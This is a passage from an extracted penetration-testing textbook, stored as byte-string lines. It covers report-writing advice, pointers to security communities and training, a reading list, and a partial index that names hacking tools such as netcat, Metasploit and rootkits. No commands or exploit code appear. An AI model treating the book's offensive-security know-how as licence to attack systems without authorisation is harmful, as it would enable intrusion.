a new page. Under the heading of each report, it may be a good idea \n', b'to emphasize to the reader that the penetration test is only a snapshot in time. \n', b'the security of networks, computers, systems, and software is dynamic. threats \n', b'and vulnerabilities change at lightning speed. As a result, a system that appears \n', b'completely impenetrable today can be easily compromised tomorrow if a new \n', b'vulnerability is discovered. As a way of indemnifying yourself against this rapid \n', b'change, it is important to communicate that the results of the test are accu-\n', b'rate as of the day you completed the assessment. setting realistic client expecta-\n', b'tions is important. remember, unless you fill a computer with concrete, drop \n', b'\x0cWrapping Up the penetration Test ChApTER 7\n', b'151\n', b'it in the middle of the ocean, and unplug it from the internet, there is always \n', b'a chance that the system can be hacked by some unknown technique or new \n', b'0-day flaw.\n', b'finally, take your time to prepare, read, reread, and properly edit your report. \n', b'it is equally as important to provide a document that is technically accurate as \n', b'well as one that is free of spelling and grammar issues. technical penetration \n', b'testing reports that contain grammar and spelling mistakes will indicate to your \n', b'client that you perform sloppy work and reflect negatively on you. remember \n', b'the penetration testing report is a direct reflection of you and your ability. in \n', b'many cases, the report is the single output that your client will see from your \n', b'efforts. You will be judged based on the level of its technical detail and findings \n', b'as well as its overall presentation and readability.\n', b'while you are reviewing your report for mistakes, take some time to closely \n', b'review the detailed output from your various tools. remember, many of the \n', b'tools that we use are written by hackers with a sense of humor. Unfortunately, \n', b'hacker humor and the professional world do not always mesh. when i first \n', b'started as penetration tester, a colleague and i found ourselves in an embarrass-\n', b'ing situation. one of the tools that we were using had attempted to log into \n', b'a particular service several hundred times using the name \xe2\x80\x9cPeter weiner.\xe2\x80\x9d As \n', b'a result, our professional-looking report was filled with examples of a not-so-\n', b'professional user account belonging to Peter weiner. it is not easy to go into a \n', b'boardroom full of professional, suit-wearing executives and discuss your ficti-\n', b'tious user named Peter weiner.\n', b'it is worth noting that in this case, the mistake was 100 percent mine. the \n', b'maker of the tool clearly discussed how to change this username in the con-\n', b'figuration settings. A more careful inspection of the reports would have caught \n', b'this before my presentation and given me time to correct it.\n', b'right or wrong, your reputation as a penetration tester will have a direct cor-\n', b'relation to the quality of the reports that you put out. learning to craft a \n', b'well-written penetration test is critical for earning repeat customers and earn-\n', b'ing future business. it is always a good idea to have a sample report in hand. \n', b'many prospective clients will ask for a sample report before making a final \n', b'decision. it is worth noting that a sample report should be just a sample. it \n', b'should not include any actual data from a real customer. never give a previous \n', b'client\xe2\x80\x99s report out as a sample, as this could represent a massive violation of the \n', b'implied or contractual confidentiality between you and your client.\n', b'to wrap up the report writing phase, it is worth mentioning that most clients \n', b'will expect you to be available after the report has been delivered. Because of \n', b'the technical and detailed nature of the penetration testing process and report, \n', b'you should expect to receive a few questions. Here again, taking time and \n', b'answering each question should be viewed as an opportunity to impress the \n', b'client and win future business rather than as an annoyance. Ultimately, good \n', b'customer service is worth its weight in gold and will often repay you 10-fold. \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'152\n', b'naturally, your willingness to work with a client and provide additional services \n', b'has to make business sense as well. You are not required to \xe2\x80\x9coverservice\xe2\x80\x9d the \n', b'account and provide endless hours of free support, but rather you need to find \n', b'a balance between providing exceptional customer service and healthy profits.\n', b'yOU DON\xe2\x80\x99T hAvE TO GO hOME BUT yOU  \n', b'CAN\xe2\x80\x99T STAy hERE\n', b'Assuming you have read the entire book (congrats by the way!), you are prob-\n', b'ably wondering \xe2\x80\x9cwhat\xe2\x80\x99s next?\xe2\x80\x9d the answer to that question depends entirely \n', b'on you. first, it is suggested that you practice and master the basic informa-\n', b'tion and techniques presented in this book. once you are comfortable with the \n', b'basics, move onto the advanced topics and tools covered in the \xe2\x80\x9cwhere do i \n', b'go from Here\xe2\x80\x9d section of each chapter.\n', b'After mastering all the material in this book, you should have a solid under-\n', b'standing of the hacking and penetration testing process. You should feel \n', b'comfortable enough with the basic information that you are able to take on \n', b'advanced topics and even specialize.\n', b'it is worth noting, however, that there is much more to hacking and penetra-\n', b'tion testing than just running tools. there are entire communities out there \n', b'that are built around these topics. You should become active in these com-\n', b'munities. introduce yourself and learn by asking questions and observing. You \n', b'should give back to these communities whenever possible. Hacking, security, \n', b'and penetration testing communities are available through various websites, \n', b'online forums, icQ, mailing lists, and news groups, and even in person.\n', b'chat rooms are a great place to learn more about security. chat rooms are usu-\n', b'ally highly focused on a single topic and, as the name implies, typically involve \n', b'lots of communication over a wide variety of subtopics pertaining to the over-\n', b'all theme of the room. in many respects, a chat room is like sitting at a bar and \n', b'listening to the conversations around you. You can participate by asking ques-\n', b'tions or simply by sitting quietly and reading the conversations of everyone in \n', b'the room.\n', b'if you have never been to a security conference (also known as a \xe2\x80\x9ccon\xe2\x80\x9d), you \n', b'owe it to yourself to go. defcon is an annual hacker convention held in las \n', b'Vegas at the end of each summer. Yes it is a bit of a circus, yes there are more \n', b'than 11,000 people attending, and yes it is hot in las Vegas in August. But \n', b'despite all that, defcon remains one of the single best security communities \n', b'on earth. in general the crowds are very pleasant, the goons (official defcon \n', b'workers) are friendly and helpful, and the community is open and inviting. the \n', b'price of admission is peanuts compared to some of the other security events, \n', b'and one more thing\xe2\x80\x94the talks are amazing.\n', b'the quality and variety of talks at defcon are nothing short of mind boggling. \n', b'talks vary each year, but they are sure to include the topics of network hacking, \n', b'web app security, physical security, hardware hacking, lock picking, and many \n', b'\x0cWrapping Up the penetration Test ChApTER 7\n', b'153\n', b'more. the speakers are not only approachable, more often than not they are \n', b'willing to take time and talk to you, answering your questions one on one. it \n', b'is consistently amazing how approachable and helpful con speakers are. it \n', b'is natural to be a little nervous when approaching someone at a conference, \n', b'especially if you have been part of an online community where \xe2\x80\x9cnewbies\xe2\x80\x9d are \n', b'put down and questions are discouraged; however, if you take the initiative, \n', b'you will often be pleasantly surprised by the openness of the entire defcon \n', b'community.\n', b'if you cannot make it to the official defcon conference, you should try to \n', b'get involved in other security communities that are closer to you. infragard, \n', b'owAsP, the Backtrack-linux forums, and many others are great resources  \n', b'for you.\n', b'reading this book and joining a security community are great ways to expand \n', b'your horizons and learn additional and advanced security concepts. following \n', b'a thread or seeing a talk will often spur an interest in a specific security topic.\n', b'once you have mastered the basics, you can look at diving more deeply into a \n', b'particular area of security. most people learn the basics, then tend to special-\n', b'ize in a particular area. this is not something you have to choose today, and \n', b'becoming specialized in a single area does not preclude you from becoming \n', b'specialized in other areas. However, in general, most people tend to be highly \n', b'focused with an advanced knowledge in one or two areas of security. the list \n', b'below is just a small sample of topics that you can specialize in. it is not meant \n', b'to be all-inclusive but rather to provide you with a sample of the various areas \n', b'that require advanced training:\n', b'n offensive security/ethical Hacking\n', b'n web Application security\n', b'n system security\n', b'n reverse engineering\n', b'n tool development\n', b'n malware Analysis\n', b'n defensive security\n', b'n software security\n', b'n digital forensics\n', b'n wireless security\n', b'WhERE DO I GO fROM hERE?\n', b'After reading this book, you may be hungry to learn more about a particular \n', b'topic, step, or technique that was discussed. now that you have mastered the \n', b'basics, there should be many additional doors open to you. if you have truly \n', b'studied, practiced, and understood the basic material presented in this book, \n', b'you are equipped to tackle more advanced training.\n', b'remember one of the main motivations for writing a book like this was not \n', b'to turn you into an elite hacker or penetration tester but rather to provide you \n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'154\n', b'with a springboard for advancing your knowledge. with a firm understand-\n', b'ing of the basics, you should feel confident and prepared to take on advanced \n', b'training in any of the areas we discussed. there are many opportunities for you \n', b'to take your skill to the next level.\n', b'if you enjoyed learning by reading this book, syngress has a series of truly amaz-\n', b'ing hacking books over a wide range of topics including (listed alphabetically)\n', b'n Aggressive Network Self-Defense: by neil r. wyler, Bruce Potter, and chris Hurley\n', b'n A Guide to Kernel Exploitation: by enrico Perla, massimiliano oldani\n', b'n Managed Code Rootkits: by erez metula\n', b'n Nessus Network Auditing: by russ rogers\n', b'n Ninja Hacking: by thomas wilhelm and Jason Andress\n', b'n PenTester\xe2\x80\x99s Open Source Tookit: by Jeremy faircloth, chris Hurley, and Jesse \n', b'Varsalone\n', b'n Professional Penetration Testing: by thomas wilhelm\n', b'n Seven Deadliest Attack Series\n', b'l Seven Deadliest Microsoft Attacks: by rob kraus, Brian Barber, mike Borkin, \n', b'and naomi Alpern\n', b'l Seven Deadliest Network Attacks: by stacy Prowell, rob kraus, and mike \n', b'Borkin\n', b'l Seven Deadliest Social Network Attacks: by carl timm and richard Perez\n', b'l Seven Deadliest Unified Communications Attacks: by dan York\n', b'l Seven Deadliest USB Attacks: by Brian Anderson and Barbara Anderson\n', b'l Seven Deadliest Web Application Attacks: by mike shema\n', b'l Seven Deadliest Wireless Technologies Attacks: by Brad Haines\n', b'n Stealing the Network: The Complete Series: by Johnny long, ryan russell, and \n', b'timothy mullen\n', b'if you are interested in a more \xe2\x80\x9chands-on\xe2\x80\x9d learning approach, there are many \n', b'great two- to five-day security boot camps available to you. these classes are \n', b'often expensive and very labor-intensive, but often highly worth their price of \n', b'admission. the Black Hat conference usually offers a series of highly special-\n', b'ized and focused classes delivered by some of the most well-known names in \n', b'security today. there are literally dozens of security topics and specializations \n', b'to choose from at these events. the trainings change from year to year, but you \n', b'can find them on the Black Hat website at: http://www.blackhat.com\n', b'the crew responsible for creating and distributing Backtrack linux also offer a \n', b'hands-on highly intense series of classes. these classes will challenge you and \n', b'push you by making you work through a series of realistic scenarios.\n', b'even traditional universities are beginning to get into the security mode \n', b'today. Just a few years ago, it was difficult to find any security-related cur-\n', b'riculum. now most universities offer at least one class or devote time during \n', b'a class to cover some security. dakota state University in madison, sd, offers \n', b'an entire Bachelor\xe2\x80\x99s degree in computer and network security along with a \n', b'master\xe2\x80\x99s degree in information Assurance and a doctorate of science with a \n', b'specialization in information Assurance.\n', b'\x0cWrapping Up the penetration Test ChApTER 7\n', b'155\n', b'if you are interested in pursuing a security-related degree through a higher \n', b'education institution, you are highly encouraged to attend an nsA-accredited \n', b'center of Academic excellence. these programs are information assurance \n', b'education degrees that have undergone a designation by the national security \n', b'Agency or the department of Homeland security to verify the value of the cur-\n', b'riculum. You can find more about this program at: http://www.nsa.gov/ia/ \n', b'academic_outreach/nat_cae/index.shtml\n', b'it is well worth your time to take a close look and examine the various security \n', b'testing methodologies including the open source security testing methodology \n', b'manual (osstmm). this book focused on the specific tools and methods used \n', b'in a penetration test. osstmm provides security professionals with a well-\n', b'defined, mature framework that can be implemented in conjunction with many \n', b'of the topics covered in this book.\n', b'Another great penetration testing methodology can be found at: http://www.\n', b'vulnerabilityassessment.co.uk. the Penetration testing framework (Ptf) is an \n', b'excellent resource for penetration testers and security assessment teams. the \n', b'Ptf includes assessment templates as well as a robust list of tools that can be \n', b'used to conduct each phase.\n', b'WRAp Up\n', b'if you read the book from front to back, take a minute to stop and consider \n', b'all that you learned. At this point, you should have a solid understanding of \n', b'the various steps involved in a typical penetration test and the tools required \n', b'to complete each of the steps. more importantly, you should understand how \n', b'the penetration testing process flows and how to take the information and out-\n', b'put from each of the phases and feed those results into the next phase. many \n', b'people are eager to learn about hacking and penetration testing, but most new-\n', b'comers only understand how to run a single tool or complete a single step. \n', b'they refuse to see the big picture and often end up spinning their wheels in \n', b'frustration when their tool does not work or provides unexpected results. this \n', b'group does not realize how the entire process works and how to leverage the \n', b'power of each phase to strengthen the phases that come after it.\n', b'for those of you who stuck with the book, completed each of the examples, \n', b'and gave an honest effort at following along, at the very least, this book should \n', b'have provided you with the knowledge and ability to see the big picture and \n', b'understand the importance of each phase.\n', b'You also now should have the ability to answer the question posed to you in a \n', b'scenario at the beginning of chapter 2:\n', b'Assume you are an ethical penetration tester working for a security \n', b'company. Your boss walks over to your office and hands you a piece  \n', b'of paper. \xe2\x80\x9cI just got off the phone with the CEO of that company.  \n', b'He wants my best employee to Pen Test his company \xe2\x80\x93 that\xe2\x80\x99s you.  \n', b'Our Legal Department will be sending you an email confirming we  \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'156\n', b'have all of the proper authorizations and insurance\xe2\x80\x9d. You nod, \n', b'accepting the job. He leaves. You flip over the paper, a single word is \n', b'written on the paper, \xe2\x80\x9cSyngress.\xe2\x80\x9d It\xe2\x80\x99s a company you\xe2\x80\x99ve never heard of \n', b'before, and no other information is written on the paper.\n', b'What now?\n', b'ThE CIRCLE Of LIfE\n', b'one of the greatest attributes of penetration testing and hacking is that you \n', b'never reach the end. Just about the time you master a particular topic or tech-\n', b'nique, someone develops a new method, attack, or procedure. that is not to \n', b'say that your original skillset is obsolete. on the contrary, a solid understand-\n', b'ing of the basics provides you with a lifelong foundation for learning the \n', b'advanced topics and staying current with the rapid pace of change.\n', b'enjoy the journey!\n', b'Patrick\n', b'SUMMARy\n', b'this chapter focused on the importance of writing the penetration testing report \n', b'and examined specific details about what needs to be included and poten-\n', b'tial pitfalls for hackers who have never written a penetration testing report. \n', b'the importance of presenting a quality report to the client was emphasized. \n', b'the chapter concluded with suggestions about where you can go to further \n', b'enhance your hacking skills once you have mastered the basics. specific recom-\n', b'mendations for getting advanced training and becoming part of the security  \n', b'community were also outlined.\n', b'Openmirrors.com\n', b'\x0c157\n', b'Index\n', b'A\n', b'Access, maintaining, 127\n', b'Back orifice, 144\n', b'ncat, 143\xe2\x80\x93144\n', b'netbus, 134\xe2\x80\x93135\n', b'netcat, 128\xe2\x80\x93133\n', b'cryptcat, 133\xe2\x80\x93134\n', b'practicing, 142\xe2\x80\x93143\n', b'rootkits, 135\xe2\x80\x93141\n', b'detecting and defending against, \n', b'141\xe2\x80\x93142\n', b'Hacker defender, 137\xe2\x80\x93141\n', b'socat, 143\xe2\x80\x93144\n', b'subseven (sub7), 144\n', b'Access control lists (Acls), 56\n', b'Acls. See Access control lists \n', b'(Acls)\n', b'Active reconnaissance, 18, 25\n', b'Advanced security concepts, 153\n', b'AfP, 67\n', b'\xe2\x80\x9cAllintitle:\xe2\x80\x9d directive, 23\n', b'APt (Advanced Package tool), 4\n', b'Attack vectors, 66, 108, 121\n', b'Authorization, 3\n', b'B\n', b'Back orifice, 144\n', b'Backtrack, 5, 6, 26\xe2\x80\x9327, 36, 69, \n', b'83\xe2\x80\x9384\n', b'working with, 6\xe2\x80\x939\n', b'Backtrack linux, 3\xe2\x80\x936, 154\n', b'Base64, 116\n', b'Bdcli100.exe, 137\n', b'Ben owned, 38, 80, 86, 118, 119\n', b'Bind and reverse payloads, difference \n', b'between, 80\n', b'Bing, 26\n', b'Black Hat conference, 154\n', b'Brute forcing letter combinations, 87\n', b'Burp Proxy, 125\n', b'Burp suite, 125\n', b'C\n', b'cAnVAs, 71\n', b'carl-fredrik, 134\n', b'chat rooms, 152\n', b'circle of life, 156\n', b'cisco AsA firewall, 20\xe2\x80\x9321\n', b'code injection attacks, 116\xe2\x80\x93120\n', b'core impact, 62, 71\n', b'cross-site scripting (xss), 121\xe2\x80\x93123\n', b'cryptcat, 133\xe2\x80\x93134\n', b'D\n', b'dakota state University website, 22\n', b'dawes, rogan, 111\n', b'defcon, 152\xe2\x80\x93153\n', b'defcon, 6, 144\n', b'defcon, 12, 70\n', b'defcon, 13, 21\n', b'de-ice cds, 102\n', b'dHcP server, 7, 8\n', b'dig, 35\xe2\x80\x9336\n', b'directxploit, 144\n', b'dns servers. See domain name \n', b'systems (dns) servers\n', b'domain name systems (dns) \n', b'servers, 28, 29\n', b'extracting information from, \n', b'32\xe2\x80\x9336\n', b'dsniff, 94\n', b'E\n', b'e-mail address, 25, 26, 68, 77\n', b'e-mail server, extracting information \n', b'from, 36\n', b'\xe2\x80\x9ceth0\xe2\x80\x9d interface, 7\xe2\x80\x938\n', b'ethereal, 95\n', b'ethical hackers, 2, 3, 18, 57\n', b'and malicious hacker, 3\n', b'ettercap, 104\n', b'executive summary, 147\n', b'exploitation, 13, 65\n', b'ettercap, 104\n', b'fast-track Autopwn, 97\xe2\x80\x93100\n', b'Hydra, 67, 103\xe2\x80\x93104\n', b'John the ripper, 81\xe2\x80\x9389\n', b'macof program, 93\xe2\x80\x9397\n', b'medusa, 67\xe2\x80\x9370\n', b'metasploit, 70\xe2\x80\x9381, 104\xe2\x80\x93105\n', b'network traffic, sniffing, 92\xe2\x80\x9393\n', b'password resetting, 89\xe2\x80\x9392\n', b'practicing, 100\xe2\x80\x93103\n', b'rainbowcrack, 104\n', b'target and desired goal, 103\xe2\x80\x93105\n', b'wireshark, 104\n', b'f\n', b'facebook, 25\xe2\x80\x9326\n', b'\xe2\x80\x9cfail closed\xe2\x80\x9d, concept of, 94\n', b'\xe2\x80\x9cfail open\xe2\x80\x9d, concept of, 94\n', b'fast-track Autopwn, 97\xe2\x80\x93100\n', b'fdisk tool, 84\n', b'fedora security spin, 14\n', b'\xe2\x80\x9cfiletype:\xe2\x80\x9d directive, 24\n', b'\xe2\x80\x9cfirst order xss\xe2\x80\x9d, 123\n', b'fPing, 47\n', b'ftP, 67, 96, 97\n', b'G\n', b'gmail, 25\n', b'google, 21, 22\xe2\x80\x9326\n', b'google cache, 23\xe2\x80\x9324\n', b'google-fu, 22, 40\n', b'google Hacking, 21\n', b'Google Hacking for Penetration Testers, \n', b'21, 40\n', b'graphical user interface (gUi), \n', b'48\xe2\x80\x9349\n', b'gUi. See graphical user interface \n', b'(gUi)\n', b'h\n', b'Hacker defender, 137\xe2\x80\x93141\n', b'Hacking lab, use and creation of, \n', b'9\xe2\x80\x9310\n', b'Harvester, 26\xe2\x80\x9328, 68\n', b'accessing, 26\xe2\x80\x9327\n', b'output, 28\n', b'Hash, 82\n', b'Hd moore, 70, 71\n', b'Hobbit, 128\n', b'Host command, 29, 31\xe2\x80\x9332, 33\n', b'output, 32\n', b'Hotmail, 25\n', b'hsdef100 file, 137\n', b'\x0cIndex\n', b'158\n', b'HttP, 67\n', b'Httrack, 19\xe2\x80\x9322\n', b'accessing, 19\n', b'Hub, 93\n', b'hxdef100.exe, 137\n', b'hxdef100.ini, 137, 140\n', b'Hydra, 67, 103\xe2\x80\x93104\n', b'icmP echo request packets, 46\n', b'I\n', b'\xe2\x80\x9cifconfig\xe2\x80\x9d, 7, 8\n', b'imAP, 67\n', b'information gathering. See \n', b'reconnaissance\n', b'insecure.org, 62\n', b'internet, 108\n', b'\xe2\x80\x9cintitle:\xe2\x80\x9d directive, 23\n', b'\xe2\x80\x9cinurl:\xe2\x80\x9d directive, 23\n', b'.iso image, 5\n', b'J\n', b'John the ripper (Jtr), 81\xe2\x80\x9389, 103\n', b'K\n', b'kAtAnA, 14\n', b'k-start dragon, 19, 72, 98, 112\n', b'L\n', b'lan manager (lm), 86\n', b'linux, 5, 46, 57\n', b'passwords, cracking of, 88\xe2\x80\x9389\n', b'linux Backtrack, 77\n', b'lm. See lan manager (lm)\n', b'lodge, david, 108\n', b'long, Johnny\n', b'defcon, 13, 21\n', b'google Hacking database \n', b'(gHdB), 40\n', b'\xe2\x80\x9clo\xe2\x80\x9d interface, 7\xe2\x80\x938\n', b'M\n', b'macof program, 93\xe2\x80\x9397\n', b'maintaining access. See Access, \n', b'maintaining\n', b'malicious hacker and ethical \n', b'hackers, 3, 28\n', b'\xe2\x80\x9cman host\xe2\x80\x9d command, 32\n', b'martorella, christian, 26\n', b'matriux, 14\n', b'medusa, 67\xe2\x80\x9370\n', b'practicing, 103\n', b'metagoofil, 36\xe2\x80\x9337\n', b'information gathering with, 69\n', b'metasploit, 16, 17, 70\xe2\x80\x9381, 94, 97, \n', b'102, 146\n', b'metasploitable, 102\n', b'\xe2\x80\x9cmetasploit Unleashed\xe2\x80\x9d, 102\n', b'meterpreter, 79\xe2\x80\x9381, 83, 104\xe2\x80\x93105, \n', b'132\xe2\x80\x93133\n', b'microsoft, 5, 7, 86, 87\n', b'mobman, 144\n', b'ms08-067, 73\xe2\x80\x9374, 75, 76\n', b'ms09-001, 74, 75\n', b'msfconsole, 72, 73\n', b'ms-sQl, 67\n', b'myspace, 25\n', b'mysQl, 67, 117\n', b'N\n', b'nessus, 58\xe2\x80\x9361, 73, 146\n', b'screenshot of, 59\n', b'setting up, 60\n', b'steps to install, 58\xe2\x80\x9359\n', b'netbus, 134\xe2\x80\x93135, 144\n', b'netcat, 128\xe2\x80\x93133, 139, 142\n', b'cryptcat, 133\xe2\x80\x93134\n', b'netcraft, 31\n', b'netware ncP, 67\n', b'network interface card (nic), 92\xe2\x80\x9393\n', b'network traffic, sniffing, 92\xe2\x80\x9393\n', b'nic. See network interface card \n', b'(nic)\n', b'nikto, 108\xe2\x80\x93109\n', b'nmap, 48, 73, 131, 146\n', b'and null scans, 56\xe2\x80\x9357\n', b'and sYn scan, 51\xe2\x80\x9352\n', b'and tcP connect scan, 49\xe2\x80\x9351\n', b'and UdP scans, 52\xe2\x80\x9355\n', b'and xmas scan, 55\xe2\x80\x9356\n', b'nntP, 67\n', b'ns lookup, 34\xe2\x80\x9335\n', b'\xe2\x80\x9cnslookup\xe2\x80\x9d command, 34\n', b'null scans, using nmap to perform, \n', b'56\xe2\x80\x9357\n', b'O\n', b'offensive security, 3\n', b'online password crackers, 67\n', b'open source security testing \n', b'methodology manual \n', b'(osstmm), 155\n', b'open web Application security \n', b'Project (owAsP) \n', b'organization, 123, 125\n', b'osstmm. See open source security \n', b'testing methodology manual \n', b'(osstmm)\n', b'osx passwords, cracking, 88\n', b'owAsP top ten Project, 124\n', b'p\n', b'Paros Proxy, 125\n', b'Passive reconnaissance, 18, 21\n', b'Password dictionary, 68, 87\n', b'Password hashes, 82, 83, 86\n', b'Password resetting, 89\xe2\x80\x9392\n', b'\xe2\x80\x9cpatch.exe\xe2\x80\x9d, 135\n', b"Paterva's maltego ce, 40\xe2\x80\x9341\n", b'Payloads, 13, 71, 79\n', b'reverse, 79\n', b'Pc Anywhere, 67\n', b'Penetration testing, 1, 66, 145\n', b'advanced security concepts, \n', b'152\xe2\x80\x93153\n', b'Backtrack, working with, 6\xe2\x80\x939\n', b'Backtrack linux, 3\xe2\x80\x936\n', b'books for, 154\n', b'circle of life, 156\n', b'definition of, 1\n', b'getting started, 2\xe2\x80\x933\n', b'guidelines, 153\xe2\x80\x93155\n', b'hacking lab, use and creation of, \n', b'9\xe2\x80\x9310\n', b'phases of, 10\n', b'four-step model, 13\xe2\x80\x9314\n', b'report writing, 146\n', b'detailed report, 147\xe2\x80\x93149\n', b'executive summary, 147\n', b'raw output, 149\xe2\x80\x93152\n', b'Penetration testing framework \n', b'(Ptf), 155\n', b'PgP server, 26\n', b'Ping and ping sweeps, 46\xe2\x80\x9348\n', b'Poc attacks. See Proof of concept \n', b'(Poc) attacks\n', b'PoP3, 67\n', b'Port numbers, and corresponding \n', b'services, 45\n', b'Port scanning, 13, 48\n', b'null scans and nmap, 56\xe2\x80\x9357\n', b'sYn scan and nmap, 51\xe2\x80\x9352\n', b'tcP connect scan and nmap, 49\xe2\x80\x9351\n', b'three-way handshake, 49, 57\xe2\x80\x9358\n', b'UdP scans and nmap, 52\xe2\x80\x9355\n', b'xmas scan and nmap, 55\xe2\x80\x9356\n', b'Poweroff command, 8\n', b'Proof of concept (Poc) attacks, 1, \n', b'101, 148\n', b'Ptf. See Penetration testing \n', b'framework (Ptf)\n', b'Python script, 26, 37\n', b'\x0cIndex  \n', b'159\n', b'R\n', b'rainbowcrack, 104\n', b'rapid, 7, 71\n', b'reboot command, 8\n', b'reconnaissance, 10\xe2\x80\x9311, 13, 15\n', b'dig, 35\xe2\x80\x9336\n', b'dns servers, 32\xe2\x80\x9336\n', b'e-mail server, extracting \n', b'information from, 36\n', b'metagoofil, 36\xe2\x80\x9337\n', b'finding attackable targets, 39\n', b'google directives, 22\xe2\x80\x9326\n', b'host command, 31\xe2\x80\x9332\n', b'Harvester, 26\xe2\x80\x9328\n', b'Httrack, 19\xe2\x80\x9322\n', b'information gathering